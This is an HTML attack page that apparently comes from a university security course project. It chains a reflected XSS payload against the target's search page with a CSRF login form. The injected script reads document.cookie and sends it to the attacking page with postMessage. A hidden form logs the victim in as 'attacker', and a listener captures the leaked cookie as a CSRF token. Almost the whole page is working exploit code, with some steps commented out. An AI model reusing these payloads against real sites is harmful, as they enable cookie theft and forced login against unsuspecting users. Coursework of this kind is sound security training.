<!DOCTYPE html>
<html lang="en">

<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js">
</script>

<script>
var string1 = "$(document).ready(function() { console.log(window.document.cookie); window.parent.postMessage(window.document.cookie, '*'); })"
var totalstring = "<script" + ">" + string1 + "</" + "script>";

// var totalstring = "<script" + ">" + "alert(document.cookie); var c = document.cookie window.parent.postMessage(document, '*');" + "</" + "script>";
var urlencoded = encodeURIComponent(totalstring);
var actualURL = "http://cis551.cis.upenn.edu/project3/search?xssdefense=0&csrfdefense=1&q=" + urlencoded;
// document.getElementById("csrfForm").src = actualURL;
// document.getElementById("overallFrame").contentWindow.location.reload();
console.log(actualURL);

window.addEventListener("message",function (e) {
	console.log(e)
	var input = document.createElement("input");
	input.type = "hidden";
	input.name = "csrf_token";
	input.value = new String(e.data);
	// document.getElementById("form1").appendChild(input);
},false);


  //   document.addEventListener("DOMContentLoaded", function(){
  //   console.log(document.getElementById("csrfForm"));
  //   console.log('hit');
  //   document.getElementById("csrfForm").submit();
  // });
</script>

<body>
<!--   style="display:none"
 --><iframe id = "overallFrame" name = "csrfFrame" src="http://cis551.cis.upenn.edu/project3/search?xssdefense=0&csrfdefense=1&q=%3Cscript%3E%24(document).ready(function()%20%7B%20console.log(window.document.cookie)%3B%20window.parent.postMessage(window.document.cookie%2C%20'*')%3B%20%7D)%3C%2Fscript%3E"></iframe> 
<form id="csrfForm" method="POST" target="csrfFrame" action="http://cis551.cis.upenn.edu/project3/login?csrfdefense=1&xssdefense=0">
    <input type="hidden" name="username" value="attacker" />
    <input type="hidden" name="password" value="123456" /> 
</form>


